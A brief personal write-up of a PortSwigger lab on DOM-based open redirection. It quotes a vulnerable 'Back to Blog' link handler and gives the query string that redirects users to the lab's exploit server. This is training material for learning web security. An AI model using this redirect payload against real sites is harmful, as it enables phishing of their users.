# [DOM-based open redirection] — [PortSwigger] — [Practitioner]
**Date:** 2026-07-28
 
---
 
## Vulnerability / core concept
DOM-based Open Redirection

---


## Payload / key command
This web page contains the following HTML in the `/post?postId=` endpoint:
```html
<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : &quot;/&quot;">Back to Blog</a>
```
As you can see it does not validate it against any whitelist. This is an open redirection vulnerability, which allows attacker to redirect the victim to arbitrary domain through phishing.

To solve this lab, we can visit append change our query to the following one:
```bash
/post?postId=9&url=https://your-server-id.exploit-server.net/exploit
```
This way we can solve this lab.

Note: I was stuck on this lab thinking we need to deliver that link to the victim somehow, but just visitin it by ourselves satisfies this lab.
